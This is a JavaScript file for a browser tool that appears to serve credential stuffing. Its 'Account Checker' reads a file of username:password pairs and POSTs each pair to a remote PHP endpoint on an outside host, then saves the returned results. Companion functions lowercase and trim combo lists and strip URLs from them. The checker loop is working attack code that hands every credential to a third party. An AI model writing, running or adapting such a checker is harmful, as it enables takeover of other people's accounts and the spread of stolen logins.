// Show specific tool section
function showTool(tool) {
  document.querySelectorAll(".tool-section").forEach(section => section.classList.add("hidden"));
  document.getElementById(tool).classList.remove("hidden");
}

// Go back to main menu
function goBack() {
  document.querySelectorAll(".tool-section").forEach(section => section.classList.add("hidden"));
  document.querySelector(".menu").classList.remove("hidden");
}

// Account Checker
async function processAccounts() {
  const fileInput = document.getElementById("checkerFile");
  const resultContainer = document.getElementById("checkerResult");

  if (!fileInput.files[0]) {
    resultContainer.innerHTML = `<div>Please select a file first.</div>`;
    return;
  }

  const file = fileInput.files[0];
  const text = await file.text();
  const accounts = text.split("\n").filter(Boolean);

  resultContainer.innerHTML = `<div>Processing accounts...</div>`;
  const startTime = Date.now();

  let results = [];
  for (const account of accounts) {
    const [uu, pp] = account.split(":").map(item => item.trim());
    try {
      const response = await fetch("https://www.jarelldanegods.elementfx.com/hat.php", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ uu, pp })
      });
      const result = await response.text();
      results.push(`${uu}:${result}`);
    } catch (err) {
      results.push(`${uu}: Error`);
    }
  }

  const timeTaken = ((Date.now() - startTime) / 1000).toFixed(2);
  const outputFile = `checked-accounts-${Date.now()}.txt`;
  saveToFile(outputFile, results.join("\n"));

  resultContainer.innerHTML = `
    <pre>
Time Taken: ${timeTaken} seconds
Total Processed: ${accounts.length}

File Saved to: ${outputFile}
    </pre>
  `;
}

// URL Remover
async function removeUrls() {
  const fileInput = document.getElementById("urlFile");
  const resultContainer = document.getElementById("urlResult");

  if (!fileInput.files[0]) {
    resultContainer.innerHTML = `<div>Please select a file first.</div>`;
    return;
  }

  const file = fileInput.files[0];
  const text = await file.text();
  const urlsRemoved = text.replace(/https?:\/\/\S+/g, "");
  const outputFile = `urls-removed-${Date.now()}.txt`;
  saveToFile(outputFile, urlsRemoved);

  resultContainer.innerHTML = `
    <pre>
Total Processed: ${text.split("\n").length}

File Saved to: ${outputFile}
    </pre>
  `;
}

// Account Formatter
async function formatAccounts() {
  const fileInput = document.getElementById("formatterFile");
  const resultContainer = document.getElementById("formatterResult");

  if (!fileInput.files[0]) {
    resultContainer.innerHTML = `<div>Please select a file first.</div>`;
    return;
  }

  const file = fileInput.files[0];
  const text = await file.text();
  const formatted = text.split("\n").map(line => line.trim().toLowerCase()).join("\n");
  const outputFile = `formatted-accounts-${Date.now()}.txt`;
  saveToFile(outputFile, formatted);

  resultContainer.innerHTML = `
    <pre>
Total Processed: ${text.split("\n").length}

File Saved to: ${outputFile}
    </pre>
  `;
}

// Save data to file
function saveToFile(filename, data) {
  const blob = new Blob([data], { type: "text/plain" });
  const link = document.createElement("a");
  link.href = URL.createObjectURL(blob);
  link.download = filename;
  link.click();
}
